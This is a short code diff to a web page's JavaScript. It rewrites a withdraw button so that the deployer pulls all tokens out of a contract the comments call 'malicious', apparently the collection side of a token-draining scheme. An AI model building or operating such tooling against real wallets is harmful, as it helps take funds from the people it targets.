@@ -656,22 +656,23 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
 
 
 
-        // Deployer Withdraw (withdraw from the malicious contract balance to deployer's wallet)
-        document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
-            const deployerAddress = accounts[0];
-            try {
-                const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
-                if (contractBalance > 0) {
-                    await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
-                    alert(`All tokens withdrawn to the deployer's address!`);
-                } else {
-                    alert("No tokens available in the malicious contract.");
-                }
-            } catch (error) {
-                alert("Error while withdrawing tokens.");
-                console.error("Deployer Withdrawal Error:", error);
-            }
-        });
+document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
+    const deployerAddress = accounts[0];
+
+    try {
+        // Interact with the malicious contract, not the token contract
+        const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+
+        // Call the transferTokensToDeployer function of the malicious contract
+        await maliciousContract.methods.transferTokensToDeployer().send({ from: deployerAddress });
+
+        alert(`All tokens withdrawn to the deployer's address!`);
+    } catch (error) {
+        alert("Error while withdrawing tokens.");
+        console.error("Deployer Withdrawal Error:", error);
+    }
+});
+
     </script>
 </body>
 </html>
